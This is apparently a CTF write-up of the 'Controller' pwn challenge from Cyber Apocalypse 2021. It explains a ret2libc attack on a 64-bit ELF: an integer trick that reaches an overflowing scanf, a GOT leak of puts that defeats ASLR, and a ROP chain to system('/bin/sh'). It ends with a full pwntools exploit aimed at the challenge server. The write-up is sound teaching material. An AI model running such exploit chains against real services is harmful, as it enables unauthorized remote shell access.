---
title: "Cyber Apocalypse CTF 2021 - Controller (ROP)"
date: 2021-10-25 14:38:11 +0100
categories: [CTF writeup, Pwn]
tags: [CTF, pwn, 64-bit ELF, buffer overflow, ROP, checksec, gdb-peda, ghidra, pwntools, ropper, gadgets]
image: /assets/img/ctf/cyber-apocalypse-2021/pwn/controller/HTB_CTF.png
pin: true
---

# Binaries analysis

## controller

We start by executing the `file` command on the two executables that were provided:

```bash
$ file controller
controller: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e5746004163bf77994992a4c4e3c04565a7ad5d6, not stripped
```

`controller` is an **ELF 64-bit**, so an executable for 64-bit Unix-like operating systems.
It is dynamically linked, which means that the **LIBC** is not directly incorporated into the binary.
Finally, it is `not stripped` so it contains symbols, which will allow us to debug and decompile it more easily.

By using `checksec`, we notice that the stack is not executable (**NX** is enabled), and that the **FULL RELRO** is active. Therefore, it will not be possible to overwrite the content of "data" sections (`.got`,` .plt` or even `.fini_array` as we did in the [previous challenge](https://amirr0r.github.io/posts/cyber-apocalypse-ctf-minefield/)):

![](/assets/img/ctf/cyber-apocalypse-2021/pwn/controller/checksec_controller.png)

## libc.so.6 

`libc.so.6` is the second binary given to us.

```bash
$ file libc.so.6
libc.so.6: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ce450eb01a5e5acc7ce7b8c2633b02cc1093339e, for GNU/Linux 3.2.0, with debug_info, not stripped
```

In general, when a `libc.so` file is provided during a CTF, the exploitation of the binary will consist in two phases:

1. Leaking the addresses of the functions of the Libc (to defeat ASLR)

2. Exploiting the binary via a Return Oriented Programming technique(**ROP**) / **ret2libc**

**Small tip**: We can execute the LIBC to determine the exact version number and see with which version of `gcc` it was compiled:

![](/assets/img/ctf/cyber-apocalypse-2021/pwn/controller/libc_version.png)

# Return Oriented Programming (ROP)

The **NX** protection prohibits the existence of memory pages that are both **executable** and **writable**. 
Therefore, writing and executing a shellcode in memory is not possible :/

❓ **Question**: If we control the execution flow _(via a buffer overflow)_ and cannot use shellcode, what can we execute?

💡 **Answer**: You can execute code which is already present in memory, such as the LIBC functions for example.

This is the key principle of `ret2libc`: if we replace the contents of the **RIP** / **EIP** register by the address of the `system()` function, and pass the string "`/bin/sh`" as an argument ... boubidi babidi babidi boo &rarr; we get a shell!

> Addresses of the `system()` function and of the "`/bin/sh`" character string are systematically mapped in memory (because they are present in the LIBC).

## Arguments and functions in `x86` and` x86_64` assembly

> The two examples which will follow will be a call of the `setbuf()` function with the contents of the register `EAX` and the value 0 as arguments.

- Giving an argument to a function in a **32-bit** architecture requires to put the values <u>on the stack</u>:

```asm
push 0x0
push eax
call 0x1234 <setbuf@plt>
```

- Giving an argument to a function in a **64-bit** architecture requires to put the values <u>in registers</u>:

```asm
mov rsi, 0x0
mov rdi, eax
call 0x1234 <setbuf@plt>
```

> On Linux, the order of the arguments follows the following register calling convention: `rdi`,` rsi`, `rdx`,`rcx`, `r8` and` r9`.

❓ **Question**: Knowing that we cannot write shellcode instructions in memory, how can we place the values of our choice in a register?

💡 **Answer**: By using **gadgets**.

![Inspector Gadget](https://c.tenor.com/FNbVw6mImasAAAAC/inspector-gadget.gif)

## Gadgets

In ROP terminology, we call "**gadget**" one or multiple assembly instructions that end with a `ret`.

As [Pixis](https://twitter.com/hackanddo) said (translation): _"It is true that a binary rarely has the code to launch a shell. It would be too good. However, we can find in one place a piece of code that allows you to do an action, then in another place another piece of code that allows you to do something else, and so on. In this way, by joining together these little bits of instructions, we can finally succeed in doing actions that were not intended by the binary."_ (Source: [hackndo.com](https://beta.hackndo.com/return-oriented-programming/))

This is very well represented by the following schema:

![](/assets/img/ctf/cyber-apocalypse-2021/pwn/controller/Return-Oriented-Programming-schema.png)

In summary:

- we are able to overwrite the contents of the **RIP** / **EIP** register,
- by making successive calls to **gadgets** we are able to obtain an arbitrary code execution.

A chain of instructions (gadgets) is called a "**ropchain**".

❓ **Question**: How do we find gadgets?

💡 **Answer**: By using any disassembler (such as `objdump`) or specific tools like [Ropper](https://github.com/sashs/Ropper) or [ROPgadget](https://github.com/JonathanSalwan/ROPgadget).

![](/assets/img/ctf/cyber-apocalypse-2021/pwn/controller/ropper.png)

# Exploitation

## 1. Understanding how the `controller` program works?

The `controller` binary works as follows:
- The `main()` function calls two functions:
    
    1. `welcome()` &rarr; which displays a simple "Control Room" message
    
    2. `calculator()` (described just after)

![](/assets/img/ctf/cyber-apocalypse-2021/pwn/controller/src_main_controller.png)

The `calculator()` function stores the value returned by the `calc()` function in a `local_c` variable (type _int_).

If this variable is equal to the hex value **0xff3a** (**65338** in decimal), the user can enter a message by calling the `scanf()` function.

This is where our buffer overflow is located. User input is not checked and it is stored in a 28 character buffer.

> **Security Recommandation**: We should have limited the number of characters via `scanf("%27c", buffer);`.

![](/assets/img/ctf/cyber-apocalypse-2021/pwn/controller/src_calculator.png)

We can split the `calc()` function into two parts:

1. Sending two integers which are lower than **0x45** (**69** in decimal) via the `scanf()` function
2. Calling to the `menu()` function to ask the user which operation he wishes to perform _(addition, subtraction, multiplication or division) _.

![](/assets/img/ctf/cyber-apocalypse-2021/pwn/controller/src_calc.png)

<!-- ![](/assets/img/ctf/cyber-apocalypse-2021/pwn/controller/src_menu.png) -->

### Calculating the offset

Remember that our goal is to control the flow of execution. This involves exploiting the buffer overflow that we have identified.

As mentioned before, the `scanf()` function which generates the buffer overflow is only called if the return of the `calc()` function is equal to 65338.

`-2147483648` and` -2147418310` are both less than 69 and if we add them (choice "1") we get 65338.
Then, if we enter a long character string (in the example below a lot of `'A'`) we can crash the program:

![](/assets/img/ctf/cyber-apocalypse-2021/pwn/controller/segfault_controller.png)

Unlike the [previous challenge](https://amirr0r.github.io/posts/cyber-apocalypse-ctf-minefield/), there is no `win()` function to call:

![](/assets/img/ctf/cyber-apocalypse-2021/pwn/controller/info_fu_controller.png)

Therefore, the goal is to <u>find a way to obtain a shell</u>.

In order to do so, we must:
- retrieve the addresses of `system()` and "`/bin/sh`" character string by _leaking_ the stack.
- overwrite the value of the **RIP** register by calling the `system ()` function with "`/bin/sh`" (via the use of a **ropchain**)

We can calculate the offset needed to override the value of **RIP** with the `pattern_create` and` pattern_search` commands:

![](/assets/img/ctf/cyber-apocalypse-2021/pwn/controller/pattern_create.png)

![](/assets/img/ctf/cyber-apocalypse-2021/pwn/controller/pattern_search.png)

The exact offset is  **40**.

## 2. Ropchain, Gadgets & LIBC Addresses Leak

In order to run the `controller` binary with the` libc.so.6` provided to us and to facilitate the development of our exploit, we can use the tool [`pwninit`](https://github.com/io12/pwninit#pwninit).

When you start to write an exploit, it is good to have a template / skeleton that you can start from. The one I am used to for ROP challenges is the following:

```python
import pwn

host = "127.0.0.1"
port = 1337

remote = False

binary_path = './vuln'
libc_path = './libc.so.6'
ld_path = './ld-2.27.so'
binary = pwn.ELF(binary_path)
libc = pwn.ELF(libc_path)
rop_binary = pwn.ROP(binary)

if remote:
    r = pwn.remote(host,port)
else:
    r = pwn.process([ld_path, binary_path], env={"LD_PRELOAD": libc_path})

# Exploit code starts here :)

r.interactive()
r.close()
```

- We start by coding the lines that allow us to enter the two integers `-2147483648` and` -2147418310`, to choose "1" and perform an addition. This will lead us to the `scanf()` function:

```python
r.sendlineafter("Insert the amount of 2 different types of recources:", b"-2147483648 -2147418310")
r.sendlineafter(">", b"1")
```

- Then we get a gadget `pop rdi; ret`:

```python
pop_rdi = (rop_binary.find_gadget(['pop rdi', 'ret']))[0]
```

- We prepare a first Ropchain to leak the address of the `puts()` function in the libc:

```python
plt_puts = binary.plt['puts']
got_puts = binary.got['puts']
main_addr = binary.symbols['main']

ropchain = buffer + pwn.p64(pop_rdi) + pwn.p64(got_puts) + pwn.p64(plt_puts) + pwn.p64(main_addr)
r.sendlineafter(">", ropchain)
```

Adding `pwn.p64 (main_addr)` to the end of our ropchain is not necessary to get a libc leak. 
However, we need it to go back to the start of the program and send a second ropchain which will allow us to obtain a shell.

- The leak is present in the second line of the answer so we make two successive calls to `recvline()`

> The first line of the response displays `Problem ingored` because our buffer does not start with` 'y' / 'Y'` ()

```python
r.recvline() # Problem ingored
leak = r.recvline().strip()
puts_addr = pwn.u64(leak.ljust(0x8, b"\x00"))
pwn.info("Puts address: 0x%x" % puts_addr)
```

![](/assets/img/ctf/cyber-apocalypse-2021/pwn/controller/puts_address.png)

- To calculate the base address of the libc, all you have to do is subtract the offset of the `puts()` function in the `libc.so.6` file from the address of the `puts()` function that we just leaked:

```python
libc_base = puts_addr - libc.symbols['puts']
pwn.info("LIBC base: 0x%x" % libc_base)
```

![](/assets/img/ctf/cyber-apocalypse-2021/pwn/controller/libc_address.png)

Now that we have the base address of the LIBC, we will be able to retrieve the addresses of `system()` and "`/bin/sh`".

## 3. Ropchain & ret2libc

- To determine the addresses of `system()` and of "`/bin/sh` ", just do the opposite operation: we add the base address of the libc to the offsets of `system()` and of "`/bin/sh`" in the file `libc.so.6`:

```python
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
pwn.info("System address: 0x%x" % system_addr)
pwn.info("'/bin/sh' address: 0x%x" % bin_sh_addr)
```

![](/assets/img/ctf/cyber-apocalypse-2021/pwn/controller/system_binsh_addresses.png)

- Now we just have to prepare the ropchain which will allow us to obtain the shell:

```python
ropchain = buffer + pwn.p64(pop_rdi) + pwn.p64(bin_sh_addr) + pwn.p64(system_addr)
```

- Using the above payload, I systematically got the error "Got EOF while reading in interactive".

Finally thanks to [this forum](https://reverseengineering.stackexchange.com/questions/21524/receiving-got-eof-while-reading-in-interactive-after-properly-executing-system), I was able to solve this problem and update the payload:

```python
ret = (rop_binary.find_gadget(['ret']))[0]  

ropchain = buffer + pwn.p64(ret) + pwn.p64(pop_rdi) + pwn.p64(bin_sh_addr) + pwn.p64(system_addr)
```

We end up sending this last ropchain and we use the `interactive()` method to interact with the shell:

```python
r.sendlineafter("Insert the amount of 2 different types of recources:", b"-2147483648 -2147418310")
r.sendlineafter(">", b"1")
r.sendlineafter(">", ropchain)

r.interactive()
r.close()
```

## 4. Final Exploit

```python
import pwn

host = "165.227.236.40"
port = 30519

remote = True

binary_path = './controller'
libc_path = './libc.so.6'
ld_path = './ld-2.27.so'
binary = pwn.ELF(binary_path)
libc = pwn.ELF(libc_path)
rop_binary = pwn.ROP(binary)

if remote:
    r = pwn.remote(host,port)
else:
    r = pwn.process([ld_path, binary_path], env={"LD_PRELOAD": libc_path})

r.sendlineafter("Insert the amount of 2 different types of recources:", b"-2147483648 -2147418310")
r.sendlineafter(">", b"1")

offset = 40
buffer = b"A" * offset

# Leak 
pop_rdi = (rop_binary.find_gadget(['pop rdi', 'ret']))[0]
plt_puts = binary.plt['puts']
got_puts = binary.got['puts']
main_addr = binary.symbols['main']

ropchain = buffer + pwn.p64(pop_rdi) + pwn.p64(got_puts) + pwn.p64(plt_puts) + pwn.p64(main_addr)
r.sendlineafter(">", ropchain)

r.recvline() # Problem ingored
leak = r.recvline().strip()
puts_addr = pwn.u64(leak.ljust(0x8, b"\x00"))
pwn.info("Puts address: 0x%x" % puts_addr)

libc_base = puts_addr - libc.symbols['puts']
pwn.info("LIBC base: 0x%x" % libc_base)

system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
pwn.info("System address: 0x%x" % system_addr)
pwn.info("'/bin/sh' address: 0x%x" % bin_sh_addr)

ret = (rop_binary.find_gadget(['ret']))[0]  

ropchain = buffer + pwn.p64(ret) + pwn.p64(pop_rdi) + pwn.p64(bin_sh_addr) + pwn.p64(system_addr)

r.sendlineafter("Insert the amount of 2 different types of recources:", b"-2147483648 -2147418310")
r.sendlineafter(">", b"1")
r.sendlineafter(">", ropchain)

r.interactive()
r.close()
```

![](/assets/img/ctf/cyber-apocalypse-2021/pwn/controller/flag_controller.png)

___

# Useful links

- <https://stackoverflow.com/questions/2535989/what-are-the-calling-conventions-for-unix-linux-system-calls-and-user-space-f>
- <https://github.com/io12/pwninit>
- <https://book.hacktricks.xyz/exploiting/linux-exploiting-basic-esp/rop-leaking-libc-address#3-finding-libc-library>
- <https://www.dailysecurity.fr/return_oriented_programming/>
- <https://beta.hackndo.com/return-oriented-programming/#pratique>
- <https://faraz.faith/2019-09-16-csaw-quals-baby-boi/>
- <https://reverseengineering.stackexchange.com/questions/21524/receiving-got-eof-while-reading-in-interactive-after-properly-executing-system>